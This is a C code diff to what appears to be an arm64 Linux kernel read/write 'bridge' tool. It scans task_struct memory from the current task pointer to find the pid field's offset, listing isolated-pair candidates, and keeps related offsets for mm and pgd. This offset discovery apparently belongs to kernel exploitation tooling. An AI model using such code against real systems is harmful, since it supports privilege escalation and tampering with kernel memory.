@@ -109,6 +109,9 @@ static char rw_stage[16] = "idle";
 
 static unsigned long cur_task;         /* sp_el0 value at init */
 static unsigned long pid_offset;       /* offset of pid in task_struct */
+static int pid_ncands;                /* isolated-pair candidates listed by S1 */
+static int pid_cand_off[8];
+static unsigned int pid_cand_val[8];
 static unsigned long mm_offset;        /* offset of mm_struct* in task_struct */
 static unsigned long pgd_offset;       /* offset of pgd in mm_struct */
 static unsigned long tasks_offset;     /* offset of tasks list_head in task_struct */
@@ -297,42 +300,71 @@ static void put_dec_u32(unsigned long off, u32 v)
  * small number (< 4194304). On arm64 Linux, task_struct has pid and
  * tgid adjacent with pid == tgid for thread group leaders.
  */
+/* Read one u32 at any alignment via its containing aligned u64. */
+static int read_u32_at(unsigned long addr, u32 *out)
+{
+    unsigned long base = addr & ~7UL;
+    unsigned long w = 0;
+    int ok = 0;
+    SAFE_READ64(w, base, ok);
+    if (!ok)
+        return -1;
+    if (addr & 4)
+        w >>= 32;
+    *out = (u32)w;
+    return 0;
+}
+
 static int find_pid_offset(unsigned long cur)
 {
-    unsigned int *p = (unsigned int *)cur;
-    unsigned long aw, bw;
-    int aok, bok;
-    u32 a, b;
-    int i;
+    unsigned long wprev = 0, wcur = 0;
+    int wi, ok = 0;
+    int match_idx[16];
+    int nmatch = 0;
+    int mi;
+    u32 plo, phi, clo, chi;
 
-    for (i = 0; i < SCAN_RANGE / 4 - 1; i++) {
-        aw = 0; bw = 0; aok = 0; bok = 0;
-        SAFE_READ64(aw, (unsigned long)&p[i], aok);
-        if (!aok)
+    pid_ncands = 0;
+    /* Pass 1: single u64 sweep. Each word yields an internal pair
+     * (lo==hi at u32 index 2w) and a cross pair with the previous
+     * word's high half (u32 index 2w-1). */
+    for (wi = 0; wi < SCAN_RANGE / 8; wi++) {
+        wcur = 0; ok = 0;
+        SAFE_READ64(wcur, cur + wi * 8, ok);
+        if (!ok) {
+            wprev = 0;
             continue;
-        SAFE_READ64(bw, (unsigned long)&p[i + 1], bok);
-        if (!bok)
-            continue;
-        a = (u32)aw; b = (u32)bw;
-        if (!(a == b && a > 0 && a < 4194304))
-            continue;
-        /* Isolated-pair rule: pid/tgid is exactly 2-wide. The classic
-         * false hit is prio/static_prio/normal_prio (all 120 for normal
-         * tasks) — a run of 3+. Skip any match with an equal neighbor
-         * on either side. */
-        {
-            unsigned long nb = 0, pf = 0;
-            int nok = 0, fok = 0;
-            if (i + 2 < SCAN_RANGE / 4)
-                SAFE_READ64(nb, (unsigned long)&p[i + 2], nok);
-            if (i > 0)
-                SAFE_READ64(pf, (unsigned long)&p[i - 1], fok);
-            if ((nok && (u32)nb == a) || (fok && (u32)pf == a))
-                continue;
         }
-        /* pid and tgid are adjacent; leader has pid == tgid */
-        return i * 4;
+        plo = (u32)(wprev >> 32); clo = (u32)wcur;
+        phi = clo; chi = (u32)(wcur >> 32);
+        if (wi > 0 && plo == clo && plo > 0 && plo < 4194304 &&
+            nmatch < 16)
+            match_idx[nmatch++] = wi * 2 - 1;
+        if (phi == chi && phi > 0 && phi < 4194304 && nmatch < 16)
+            match_idx[nmatch++] = wi * 2;
+        wprev = wcur;
     }
+    /* Pass 2: isolated-pair rule on matches only. pid/tgid is exactly
+     * 2-wide; runs of 3+ (prio/static_prio/normal_prio, all 120) are
+     * skipped. Userspace knows its own pid and picks the true slot. */
+    for (mi = 0; mi < nmatch && pid_ncands < 8; mi++) {
+        int i = match_idx[mi];
+        u32 a = 0, nb = 0, pf = 0;
+        int nbok = 0, pfok = 0;
+        if (read_u32_at(cur + i * 4, &a))
+            continue;
+        if (i + 2 < SCAN_RANGE / 4)
+            nbok = !read_u32_at(cur + (i + 2) * 4, &nb);
+        if (i > 0)
+            pfok = !read_u32_at(cur + (i - 1) * 4, &pf);
+        if ((nbok && nb == a) || (pfok && pf == a))
+            continue;
+        pid_cand_off[pid_ncands] = i * 4;
+        pid_cand_val[pid_ncands] = a;
+        pid_ncands++;
+    }
+    if (pid_ncands > 0)
+        return pid_cand_off[0];
     return -1;
 }
 
@@ -594,6 +626,14 @@ static int st_pid(void)
         my_pid_val = myok ? (unsigned int)myw : 0;
     }
         { rb_puts("rwbridge: pid_offset="); rb_put_dec((unsigned long)(pid_offset)); rb_puts(" (pid="); rb_put_u32((unsigned int)(my_pid_val)); rb_puts(")"); rb_putc('\n'); };
+    if (pid_ncands > 0) {
+        int ci = 0;
+        { rb_puts("rwbridge: pid cands:"); };
+        for (ci = 0; ci < pid_ncands; ci++) {
+            { rb_puts(" "); rb_put_dec((unsigned long)(pid_cand_off[ci])); rb_puts("="); rb_put_u32((unsigned int)(pid_cand_val[ci])); };
+        }
+        { rb_putc('\n'); };
+    }
     return 0;
 }
 
